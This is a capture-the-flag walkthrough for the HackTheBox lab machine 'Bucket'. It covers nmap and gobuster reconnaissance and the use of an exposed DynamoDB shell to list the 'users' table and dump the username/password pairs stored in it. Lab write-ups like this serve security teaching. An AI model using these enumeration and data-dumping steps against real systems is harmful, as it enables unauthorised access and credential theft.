# Bucket

export IP=10.10.10.212

# Solution

Start with a nmap scan

```
cmd: nmap -sC -sV -oN nmap/initial $IP

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://bucket.htb/

```
We can already see a domain (<b> bucket.htb </b>), lets add to /etc/hosts <br>

Lets do an all port on the side... UPDATE: was taking toooo long, cancelled<br>

Visiting the website, we can already see two things
```
support@bucket.htb
http://s3.bucket.htb/adserver/images/bug.jpg
```

maybe <b> s3 </b> is a subdomain, lets add it to the /etc/hosts ! <br>

There is not much else to see... <br>

Lets fuzz 
```
cmd: gobuster dir -u http://bucket.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -o gobuster/big.log -x php,html,txt -t 70

/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.txt (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
```

Another gobuster (on the s3.bucket.htb)
```
/health (Status: 200)
/server-status (Status: 403)
/shell (Status: 200)
```

We now have a shell to interact with the dynamoDb in the AWS server (S3) <br>

After researching docs i listed all the tables (in the current db)
```

REQUEST
-----------------------------------------------------
dynamodb.listTables().eachPage(function(err, data) {
    if (err) {
        ppJson(err); // an error occurred
    } else if (data) {
        ppJson(data);
    }
});

######################################################

RESPONSE
-----------------------------------------------------
TableNames : Users
```

Now we need to check its structure
```
REQUEST
-----------------------------------------------------
var params = {
    TableName: "users",
};
dynamodb.describeTable(params, function(err, data) {
    if (err) ppJson(err); // an error occurred
    else ppJson(data); // successful response
});

######################################################
RESPONSE
-----------------------------------------------------

AttributeDefinitions : [
    "0" : {
        "AttributeName" : "username",
        "AttributeType" : S (string?!?!)
    },
    "1" : {
        "AttributeName" : "password",
        "AttributeType" : S (string?!?!)
    }

]
```

Types 
```
S - the attribute is of type String
N - the attribute is of type Number
B - the attribute is of type Binary
```

Now lets dump all the table !! 
```
REQUEST
-----------------------------------------------------
var params = {
    TableName: 'users',
    Select: "ALL_ATTRIBUTES"
};
docClient.scan(params, function(err, data) {
    if (err) ppJson(err); // an error occurred
    else ppJson(data); // successful response
});

######################################################
RESPONSE
-----------------------------------------------------
Items : [
    "0" : {
        "password" : "Management@#1@#",
        "username" : "Mgmt"
    },
    "1" : {
        "password" : "Welcome123!",
        "username" : "Cloudadm"
    },
    "2" : {
        "password" : "n2vM-<_K_Q:.Aa2",
        "username" : "Sysadm"
    }
]

```

Check tutorial on the shell